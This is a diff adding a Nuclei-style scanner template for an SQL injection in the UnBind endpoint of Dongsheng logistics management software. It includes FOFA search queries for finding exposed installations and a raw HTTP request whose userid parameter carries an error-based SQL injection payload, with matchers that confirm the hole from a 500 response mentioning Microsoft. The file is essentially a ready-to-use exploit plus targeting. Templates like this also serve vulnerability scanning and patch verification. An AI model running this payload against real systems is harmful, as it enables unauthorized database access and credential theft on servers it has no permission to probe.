@@ -1,0 +1,24 @@
+id: dongsheng-logistics-unbind-sqli
+
+info:
+  name: "东胜物流软件 UnBind 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+          东胜物流信息管理系统 UnBind 接口存在未经验证的SQL注入漏洞。该接口未正确过滤用户输入参数，允许攻击者通过构造恶意SQL语句执行非授权数据库操作。成功利用该漏洞可导致敏感数据泄露（包括但不限于管理员凭证、用户隐私信息），在具备足够权限的情况下，攻击者可通过联合查询或带外技术向目标服务器写入恶意代码，最终实现对宿主系统的完全控制。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    GET /Mobile/Login/UnBind?userid=-2963%27+OR+1636+IN+%28SELECT+%28%40%40VERSION%2B%28SELECT+%28CASE+WHEN+%281636%3D1636%29+THEN+1+ELSE+0+END%29%29%2B%40%40VERSION%29%29--+oTEn HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'Microsoft'
